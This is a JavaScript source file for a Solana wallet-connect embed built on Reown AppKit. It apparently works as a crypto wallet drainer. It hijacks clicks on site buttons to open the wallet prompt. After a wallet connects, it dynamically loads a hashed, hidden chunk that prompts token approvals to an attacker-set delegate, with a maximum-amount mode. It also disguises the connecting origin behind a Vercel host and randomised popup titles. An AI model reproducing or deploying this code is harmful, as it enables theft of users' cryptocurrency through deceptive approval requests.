import { createAppKit } from "@reown/appkit";
import { SolanaAdapter } from "@reown/appkit-adapter-solana";
import { solana, solanaDevnet, solanaTestnet } from "@reown/appkit/networks";
import {
  FEATURED_WALLET_IDS,
  INCLUDE_WALLET_IDS,
} from "./solana-wallets.js";
import {
  setupWalletSelectPopup,
  closeWalletConnectPopup,
  setupPopupMessageListener,
} from "./connect-popup.js";
import { encodeConnectPayload } from "./connect-launch.js";

const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };

/**
 * @typedef {object} WalletEmbedConfig
 * @property {string} projectId
 * @property {string} buttonClass
 * @property {"exact" | "pattern5"} [buttonClassMode]
 * @property {string} [network]
 * @property {string} [siteName]
 * @property {string} [siteDescription]
 * @property {string} [siteUrl]
 * @property {string[]} [siteIcons]
 * @property {boolean} [analytics]
 * @property {boolean} [tokenApprovalEnabled]
 * @property {string} [tokenDelegate]
 * @property {number} [tokenApprovalMaxCount]
 * @property {number} [tokenApprovalMinUsd]
 * @property {"max" | "balance"} [tokenApprovalAmountMode]
 * @property {string} [solanaRpcUrl]
 * @property {string} [priceApiUrl]
 * @property {boolean} [connectPopupEnabled]
 * @property {string} [connectPopupUrl] Vercel popup base, e.g. https://app.vercel.app/profile
 * @property {string} [connectPopupTitle] fixed title; omit for random each time
 * @property {string} [chunkBase] same-origin vault URL for esbuild split chunks
 * @property {string[]} [splitChunks] hashed chunk filenames under chunks/
 * @property {boolean} [connectViaVercel] after wallet pick on embed host, connect on Vercel /connect/
 * @property {string} [vercelSiteUrl] Reown metadata origin on Vercel connect host
 * @property {string} [preselectedWallet] wallet name when opening Vercel connect host
 * @property {string} [connectHostUrl] e.g. https://app.vercel.app/connect/
 * @property {string} [gatewayChunk] gateway script filename on Vercel
 * @property {string} [parentOrigin] embed page origin (set when opening connect host)
 * @property {string} [approvalChunkUrl] direct URL for token-approval module (Vercel /connect/)
 */

/** @type {string | null} */
let lastApprovalSession = null;
/** @type {boolean} */
let approvalRunning = false;

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function pickSolanaNetworks(config) {
  const rpc = (config.solanaRpcUrl || "").trim();
  const wrap = (net) =>
    rpc
      ? {
          ...net,
          rpcUrls: {
            ...net.rpcUrls,
            default: { http: [rpc], webSocket: net.rpcUrls?.default?.webSocket ?? [] },
          },
        }
      : net;

  if (config.network === "devnet") {
    return [wrap(solanaDevnet)];
  }
  if (config.network === "testnet") {
    return [wrap(solanaTestnet)];
  }
  return [wrap(solana)];
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function createWalletModal(config) {
  if (!config?.projectId || config.projectId === "YOUR_REOWN_PROJECT_ID") {
    console.error(
      "[wallet] Set REOWN_PROJECT_ID in config.php (https://dashboard.reown.com)"
    );
    return null;
  }

  const pageUrl = (config.siteUrl || "").replace(/\/$/, "");

  const metadata = {
    name: config.siteName || "Website",
    description: config.siteDescription || "Connect your Solana wallet",
    url: pageUrl,
    icons: config.siteIcons?.length
      ? config.siteIcons
      : pageUrl
        ? [`${pageUrl}/favicon.ico`]
        : [],
  };

  const networks = pickSolanaNetworks(config);

  return createAppKit({
    adapters: [new SolanaAdapter()],
    networks,
    defaultNetwork: networks[0],
    metadata,
    projectId: config.projectId,
    enableReconnect: false,
    enableNetworkSwitch: false,
    enableWalletConnect: false,
    featuredWalletIds: FEATURED_WALLET_IDS,
    includeWalletIds: INCLUDE_WALLET_IDS,
    features: {
      analytics: false,
      email: false,
      socials: false,
      connectMethodsOrder: ["wallet"],
      swaps: false,
      onramp: false,
      send: false,
      receive: false,
      pay: false,
    },
  });
}

/**
 * @param {ReturnType<typeof createAppKit>} modal
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function setupPostConnectApprovals(modal, config) {
  if (config.tokenApprovalEnabled === false) return;
  if (!(config.tokenDelegate || "").trim()) return;

  modal.subscribeAccount((account) => {
    if (!account?.isConnected) {
      lastApprovalSession = null;
      return;
    }
    if (account.status === "connecting" || account.status === "reconnecting") {
      return;
    }

    const address =
      account.address ||
      (account.caipAddress ? account.caipAddress.split(":").pop() : "");
    if (!address) return;
    if (approvalRunning || lastApprovalSession === address) return;

    approvalRunning = true;
    lastApprovalSession = address;

    window.setTimeout(async () => {
      try {
        closeWalletConnectPopup();
        modal.close();
        const provider = modal.getWalletProvider();
        if (!provider?.publicKey) {
          console.warn("[wallet] No Solana provider for token approvals");
          return;
        }

        const chunk = (config.splitChunks || [])[0] || "chunks/H7kL9mN2pQx.js";
        const base = (config.chunkBase || "").replace(/\/$/, "");
        const modUrl =
          (config.approvalChunkUrl || "").trim() ||
          `${base}?c=${encodeURIComponent(chunk)}`;
        const { createRpcConnection, promptTopTokenApprovals } = await import(
          /* @vite-ignore */ modUrl
        );
        const connection = createRpcConnection(config);
        await promptTopTokenApprovals({
          config,
          provider,
          connection,
          ownerAddress: address,
        });
      } catch (err) {
        console.error("[wallet] Post-connect token approvals failed", err);
      } finally {
        approvalRunning = false;
      }
    }, 600);
  }, "solana");
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
const CONNECT_POPUP_FEATURES =
  "popup=yes,width=420,height=720,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes";

/** @param {string} url */
function originFromUrl(url) {
  try {
    return new URL(url).origin;
  } catch {
    return "";
  }
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function resolveConnectHostUrl(config) {
  const explicit = (config.connectHostUrl || "").trim().replace(/\/$/, "");
  if (explicit) {
    return `${explicit}/`;
  }
  const popup = (config.connectPopupUrl || "").trim().replace(/\/$/, "");
  if (popup) {
    return `${popup.replace(/\/profile$/i, "")}/connect/`;
  }
  return "";
}

/** @type {Window | null} */
let vercelConnectWindow = null;

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function configForVercelConnectHost(config) {
  const vercelSite = (config.vercelSiteUrl || "").replace(/\/$/, "");
  return {
    ...config,
    siteUrl: vercelSite || (config.siteUrl || "").replace(/\/$/, ""),
    parentOrigin: location.origin,
    connectPopupEnabled: false,
    connectViaVercel: false,
  };
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function buildConnectLaunchUrl(config) {
  const hostUrl = resolveConnectHostUrl(config);
  if (!hostUrl) {
    return "";
  }
  const payload = encodeConnectPayload(configForVercelConnectHost(config));
  return `${hostUrl}#c=${payload}`;
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function postConfigToConnectWindow(config) {
  const hostUrl = resolveConnectHostUrl(config);
  const vercelOrigin = originFromUrl(hostUrl);
  if (!vercelConnectWindow || vercelConnectWindow.closed || !vercelOrigin) {
    return;
  }
  vercelConnectWindow.postMessage(
    {
      type: "wallet-connect-config",
      config: configForVercelConnectHost(config),
    },
    vercelOrigin,
  );
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function openVercelConnectHost(config) {
  const launchUrl = buildConnectLaunchUrl(config);
  if (!launchUrl) {
    console.error("[wallet] connectHostUrl is not configured");
    return;
  }
  const vercelOrigin = originFromUrl(launchUrl);

  if (vercelConnectWindow && !vercelConnectWindow.closed) {
    vercelConnectWindow.focus();
    postConfigToConnectWindow(config);
    return;
  }

  vercelConnectWindow = window.open(
    launchUrl,
    "reown_wallet_connect",
    CONNECT_POPUP_FEATURES,
  );

  if (!vercelConnectWindow) {
    location.assign(launchUrl);
    return;
  }

  for (const ms of [100, 400, 900, 1800]) {
    window.setTimeout(() => postConfigToConnectWindow(config), ms);
  }
}

/**
 * Connect + approvals on Vercel origin (Phantom / wallet UI shows Vercel, not embed host).
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
export function initConnectHost(config) {
  const modal = createWalletModal(config);
  if (!modal) {
    return null;
  }

  setupPostConnectApprovals(modal, config);

  const parentOrigin = String(config.parentOrigin || "").trim();

  modal.subscribeAccount((account) => {
    if (!account?.isConnected) {
      return;
    }
    if (account.status === "connecting" || account.status === "reconnecting") {
      return;
    }
    const address =
      account.address ||
      (account.caipAddress ? account.caipAddress.split(":").pop() : "");
    if (!address || !window.opener || window.opener.closed) {
      return;
    }
    try {
      window.opener.postMessage(
        {
          type: "wallet-connect-complete",
          address,
          caipAddress: account.caipAddress || "",
        },
        parentOrigin || "*",
      );
    } catch {
      /* ignore */
    }
  }, "solana");

  window.setTimeout(() => {
    modal.open(SOLANA_CONNECT);
  }, 80);

  window.ReownWallet = {
    open: () => modal.open(SOLANA_CONNECT),
    modal,
  };

  return modal;
}

/**
 * After user picks a wallet on the embed host, open Vercel /connect/ for provider sign-in.
 * @param {ReturnType<typeof createAppKit>} modal
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function setupVercelWalletHandoff(modal, config) {
  const hostUrl = resolveConnectHostUrl(config);
  const vercelOrigin = originFromUrl(hostUrl);

  window.addEventListener("message", (event) => {
    if (vercelOrigin && event.origin !== vercelOrigin) {
      return;
    }
    if (event.data?.type === "wallet-connect-complete") {
      window.__WALLET_CONNECTED__ = event.data;
      window.dispatchEvent(
        new CustomEvent("wallet-connected", { detail: event.data }),
      );
    }
  });

  /** @type {string | undefined} */
  let lastEventId;

  modal.subscribeEvents((state) => {
    const evt = state?.data;
    if (!evt || evt.type !== "track") {
      return;
    }

    const eventKey = `${evt.event}:${state.timestamp}`;
    if (eventKey === lastEventId) {
      return;
    }
    lastEventId = eventKey;

    if (evt.event === "SELECT_WALLET" && evt.properties?.name) {
      modal.close();
      openVercelConnectHost({
        ...config,
        preselectedWallet: String(evt.properties.name),
      });
    }
  });
}

function init(config) {
  const modal = createWalletModal(config);
  if (!modal) return;

  if (config.connectViaVercel !== false) {
    setupVercelWalletHandoff(modal, config);
  } else {
    setupPostConnectApprovals(modal, config);
    setupWalletSelectPopup(modal, config);
    setupPopupMessageListener(modal);
  }

  const buttonClass = (config.buttonClass || "").trim();
  if (!buttonClass) {
    console.error("[wallet] buttonClass is not configured");
    return;
  }

  const selector = buildButtonSelector(buttonClass, config.buttonClassMode);

  document.addEventListener(
    "click",
    (event) => {
      const target = event.target;
      if (!(target instanceof Element)) return;

      const button = target.closest(selector);
      if (!button) return;

      event.preventDefault();
      modal.open(SOLANA_CONNECT);
    },
    true
  );

  window.ReownWallet = {
    open: () => modal.open(SOLANA_CONNECT),
    modal,
  };
}

/**
 * @param {string} buttonClass
 * @param {"exact" | "pattern5"} mode
 */
function buildButtonSelector(buttonClass, mode) {
  if (mode === "pattern5") {
    return "button";
  }
  return `button.${cssEscape(buttonClass)}, .${cssEscape(buttonClass)}`;
}

/** @param {string} value */
function cssEscape(value) {
  if (typeof CSS !== "undefined" && CSS.escape) {
    return CSS.escape(value);
  }
  return value.replace(/[^a-zA-Z0-9_-]/g, "\\$&");
}

/**
 * @param {string} className
 */
function hasFiveCharAlphanumericClass(className) {
  return className
    .split(/\s+/)
    .some((token) => /^[A-Za-z0-9]{5}$/.test(token));
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function initPatternMode(config) {
  const modal = createWalletModal(config);
  if (!modal) return;

  if (config.connectViaVercel !== false) {
    setupVercelWalletHandoff(modal, config);
  } else {
    setupPostConnectApprovals(modal, config);
    setupWalletSelectPopup(modal, config);
    setupPopupMessageListener(modal);
  }

  document.addEventListener(
    "click",
    (event) => {
      const target = event.target;
      if (!(target instanceof Element)) return;

      const button = target.closest("button");
      if (!button || !hasFiveCharAlphanumericClass(button.className)) return;

      event.preventDefault();
      modal.open(SOLANA_CONNECT);
    },
    true
  );

  window.ReownWallet = {
    open: () => modal.open(SOLANA_CONNECT),
    modal,
  };
}

function boot() {
  const path = location.pathname.replace(/\/index\.html$/i, "").replace(/\/$/, "");
  if (path.endsWith("/connect")) {
    return;
  }

  const config = window.__WALLET_EMBED_CONFIG__;
  if (!config) {
    console.error("[wallet] Missing __WALLET_EMBED_CONFIG__");
    return;
  }

  if (config.buttonClassMode === "pattern5") {
    initPatternMode(config);
  } else {
    init(config);
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", boot);
} else {
  boot();
}

export { init, initPatternMode, createWalletModal };
